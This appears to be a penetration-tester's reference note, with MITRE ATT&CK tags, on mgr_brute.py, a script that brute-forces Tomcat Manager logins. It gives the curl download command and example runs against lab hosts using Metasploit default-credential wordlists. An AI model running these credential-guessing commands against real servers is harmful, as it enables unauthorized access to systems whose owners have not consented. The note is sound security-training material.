---
title: mgr_brute.py
aliases: []
tags:
- tool/mgr_brute.py
- technique/t1110
- attack/brute-force
category: tools
status: draft
date_created: '2026-08-26'
date_modified: '2026-08-26'
source: TomcatManagerLoginCredsBruteforce.md
related_tools:
- '[[python3]]'
- '[[curl]]'
related_techniques:
- '[[T1110]]'
related_tactics:
- '[[TA0003]]'
related_services:
- '[[http]]'
related_os: []
related_notes: []
mitre_tactic: TA0003
mitre_technique: T1110
real_path: ''
port: ''
protocol: ''
os: ''
---

# mgr_brute.py

## Description
This script is designed to perform a brute-force attack against the Tomcat Manager application. It is intended to be used to test the security of the application by attempting to authenticate with a list of usernames and passwords.

## Usage
```bash
# Download and save the script
$ curl https://raw.githubusercontent.com/b33lz3bub-1/Tomcat-Manager-Bruteforce/refs/heads/master/mgr_brute.py -o mgr_brute.py

# Execute the script
$ python3 mgr_brute.py -u users.txt -p pass.txt -U http://10.10.10.194:8080/ -P host-manager/

# Another example
$ python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```

## References
- https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce

